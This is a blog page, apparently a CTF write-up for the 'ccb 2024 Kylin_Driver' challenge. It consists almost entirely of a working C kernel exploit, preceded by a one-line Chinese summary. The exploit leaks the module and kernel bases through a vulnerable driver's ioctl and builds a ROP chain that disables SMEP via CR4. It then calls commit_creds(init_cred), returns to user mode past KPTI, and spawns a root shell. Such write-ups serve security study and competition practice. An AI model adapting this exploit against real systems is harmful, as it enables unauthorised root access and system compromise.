@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;">
+    <title>ccb 2024 Kylin_Driver</title>
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <header>
+        <nav class="site-nav">
+            <a href="./index.html" class="nav-link">/home</a>
+            <span class="nav-separator">|</span>
+            <a href="./about.html" class="nav-link">/about</a>
+        </nav>
+        <div class="terminal-prompt">
+            <span style="color:#666">[</span><span style="color:#fabd2f">ayoung</span><span style="color:#666">@</span><span style="color:#59adeb">lab</span> <span style="color:#83a598"><a href="./index.html" class="path-link">posts</a></span><span style="color:#666">]$</span> 
+            <span class="cmd">cat ./ccb 2024 Kylin_Driver.md</span><span class="cursor">█</span>
+        </div>
+        <h1 class="post-title">ccb 2024 Kylin_Driver</h1><div style="color: #666; font-size: 0.8rem; margin-bottom: 20px;">[Last modified: 2024-09-08]</div>
+    </header>
+    <main><p>先读ko基址和栈上残留的内核基址，找gadget，利用提供的功能能直接跳转rop执行，需要绕一下smep和kpti</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">_GNU_SOURCE
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">errno.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdio.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdlib.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">unistd.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">fcntl.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/wait.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/stat.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">string.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#c0c5ce;">size_t user_cs,user_ss,user_rflags,user_sp;
+</span><span style="color:#c0c5ce;">size_t commit_creds=</span><span style="color:#d08770;">0xcf720</span><span style="color:#c0c5ce;">,prepare_kernel_cred=</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">size_t prdi_r = </span><span style="color:#d08770;">0x1b6c35</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">size_t init_cred = </span><span style="color:#d08770;">0x1864660</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">size_t mov_cr4_rdi = </span><span style="color:#d08770;">0xD</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">size_t swapgs_popfq_r = </span><span style="color:#d08770;">0x11</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">size_t mov_rdi_rax_ret = </span><span style="color:#d08770;">0x9</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">size_t ireq_ret = </span><span style="color:#d08770;">0x15</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">size_t XyJrLzKpQvNmHtBrVwTsKxMfLdYnJqOpTy = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">size_t leak_addr = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">size_t _offset = </span><span style="color:#d08770;">0x32a555</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">size_t swapgs_restore_regs_and_return_to_usermode = </span><span style="color:#d08770;">0xc00ff0</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">0x36</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">save_status</span><span style="color:#c0c5ce;">()
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">__asm__</span><span style="color:#c0c5ce;">(
+</span><span style="color:#c0c5ce;">    &quot;</span><span style="color:#a3be8c;">mov user_cs,cs;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">    &quot;</span><span style="color:#a3be8c;">mov user_ss,ss;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">    &quot;</span><span style="color:#a3be8c;">mov user_sp,rsp;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">    &quot;</span><span style="color:#a3be8c;">pushf;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">    &quot;</span><span style="color:#a3be8c;">pop user_rflags;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">  );
+</span><span style="color:#c0c5ce;">  </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[*] status has been saved.</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">size_t </span><span style="color:#8fa1b3;">update_system_gadgets</span><span style="color:#c0c5ce;">(size_t </span><span style="color:#bf616a;">vmmbase</span><span style="color:#c0c5ce;">){
+</span><span style="color:#c0c5ce;">	commit_creds+=vmmbase;
+</span><span style="color:#c0c5ce;">    prdi_r+=vmmbase;
+</span><span style="color:#c0c5ce;">    init_cred+=vmmbase;
+</span><span style="color:#c0c5ce;">    swapgs_restore_regs_and_return_to_usermode+=vmmbase;
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">size_t </span><span style="color:#8fa1b3;">update_testko_gadgets</span><span style="color:#c0c5ce;">(size_t </span><span style="color:#bf616a;">kobase</span><span style="color:#c0c5ce;">){
+</span><span style="color:#c0c5ce;">    swapgs_popfq_r+=kobase;
+</span><span style="color:#c0c5ce;">    mov_rdi_rax_ret+=kobase;
+</span><span style="color:#c0c5ce;">    ireq_ret+=kobase;
+</span><span style="color:#c0c5ce;">    mov_cr4_rdi+=kobase;
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">getshell</span><span style="color:#c0c5ce;">(){
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">(!</span><span style="color:#8fa1b3;">getuid</span><span style="color:#c0c5ce;">()){
+</span><span style="color:#c0c5ce;">		</span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[*]Root now</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">		</span><span style="color:#96b5b4;">system</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/bin/sh</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">	}
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">else</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">		</span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">not root yet</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">	}
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#b48ead;">typedef struct </span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> buf1[</span><span style="color:#d08770;">32</span><span style="color:#c0c5ce;">];
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> buf2[</span><span style="color:#d08770;">512</span><span style="color:#c0c5ce;">];
+</span><span style="color:#c0c5ce;">} a;
+</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">main</span><span style="color:#c0c5ce;">()
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">save_status</span><span style="color:#c0c5ce;">();
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> fd = </span><span style="color:#8fa1b3;">open</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/dev/test</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    a a;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(fd&lt;</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">perror</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">open</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">strcpy</span><span style="color:#c0c5ce;">(a.</span><span style="color:#bf616a;">buf1</span><span style="color:#c0c5ce;">, &quot;</span><span style="color:#a3be8c;">gtwYHamW4U2yQ9LQzfFJSncfHgFf5Pjc</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> i = </span><span style="color:#d08770;">0 </span><span style="color:#c0c5ce;">; i &lt; </span><span style="color:#d08770;">32</span><span style="color:#c0c5ce;">; i++)
+</span><span style="color:#c0c5ce;">        *(a.</span><span style="color:#bf616a;">buf1</span><span style="color:#c0c5ce;">+i)^=</span><span style="color:#d08770;">0xf9</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">ioctl</span><span style="color:#c0c5ce;">(fd, </span><span style="color:#d08770;">0xDEADBEEF</span><span style="color:#c0c5ce;">, &amp;a);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> i = </span><span style="color:#d08770;">0 </span><span style="color:#c0c5ce;">; i &lt; </span><span style="color:#d08770;">0x200</span><span style="color:#c0c5ce;">; i++)
+</span><span style="color:#c0c5ce;">        *(a.</span><span style="color:#bf616a;">buf2</span><span style="color:#c0c5ce;">+i)^=</span><span style="color:#d08770;">0xf9</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    XyJrLzKpQvNmHtBrVwTsKxMfLdYnJqOpTy = *(size_t*)(a.</span><span style="color:#bf616a;">buf2</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    leak_addr = *(size_t*)(a.</span><span style="color:#bf616a;">buf2</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">0xa8</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    leak_addr-=_offset;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] kobase 0x</span><span style="color:#d08770;">%llx</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, (</span><span style="color:#b48ead;">long long</span><span style="color:#c0c5ce;">)XyJrLzKpQvNmHtBrVwTsKxMfLdYnJqOpTy);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] vmbase 0x</span><span style="color:#d08770;">%llx</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, (</span><span style="color:#b48ead;">long long</span><span style="color:#c0c5ce;">)leak_addr);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">update_system_gadgets</span><span style="color:#c0c5ce;">(leak_addr);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">update_testko_gadgets</span><span style="color:#c0c5ce;">(XyJrLzKpQvNmHtBrVwTsKxMfLdYnJqOpTy);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">	</span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[*]commit_creds: 0x</span><span style="color:#d08770;">%llx</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, (</span><span style="color:#b48ead;">long long</span><span style="color:#c0c5ce;">)commit_creds);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">	size_t rop[</span><span style="color:#d08770;">0x500</span><span style="color:#c0c5ce;">];
+</span><span style="color:#c0c5ce;">	</span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">((</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;">*)rop, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x500</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> i = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">	rop[i++] = prdi_r;
+</span><span style="color:#c0c5ce;">	rop[i++] = </span><span style="color:#d08770;">0x6f0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">	rop[i++] = mov_cr4_rdi;
+</span><span style="color:#c0c5ce;">    rop[i++] = prdi_r;
+</span><span style="color:#c0c5ce;">	rop[i++] = init_cred;
+</span><span style="color:#c0c5ce;">	rop[i++] = commit_creds;
+</span><span style="color:#c0c5ce;">	rop[i++] = swapgs_restore_regs_and_return_to_usermode;
+</span><span style="color:#c0c5ce;">    rop[i++] = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    rop[i++] = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    rop[i++] = (size_t)getshell;
+</span><span style="color:#c0c5ce;">    rop[i++] = user_cs;
+</span><span style="color:#c0c5ce;">    rop[i++] = user_rflags;
+</span><span style="color:#c0c5ce;">    rop[i++] = user_sp;
+</span><span style="color:#c0c5ce;">    rop[i++] = user_ss;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memcpy</span><span style="color:#c0c5ce;">((</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;">*)a.</span><span style="color:#bf616a;">buf2</span><span style="color:#c0c5ce;">, (</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;">*)rop, </span><span style="color:#d08770;">0x500</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> i = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; i &lt; </span><span style="color:#d08770;">0x500</span><span style="color:#c0c5ce;">; i++)
+</span><span style="color:#c0c5ce;">        *(a.</span><span style="color:#bf616a;">buf2</span><span style="color:#c0c5ce;">+i)^=</span><span style="color:#d08770;">0xf9</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">ioctl</span><span style="color:#c0c5ce;">(fd, </span><span style="color:#d08770;">0xFEEDFACE</span><span style="color:#c0c5ce;">, &amp;a);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">}
+</span></pre>
+</main> 
+    <footer style="margin-top: 50px; border-top: 1px solid #333; padding-top: 20px; font-size: 0.8rem; color: #555; text-align: center;">
+        Built with Rust. <span style="color: #66ed59;">EOF</span>
+    </footer>
+    <button id="back-to-top" aria-label="Back to Top">^TOP</button>
+    <script src="script.js"></script>
+</body>
+</html>
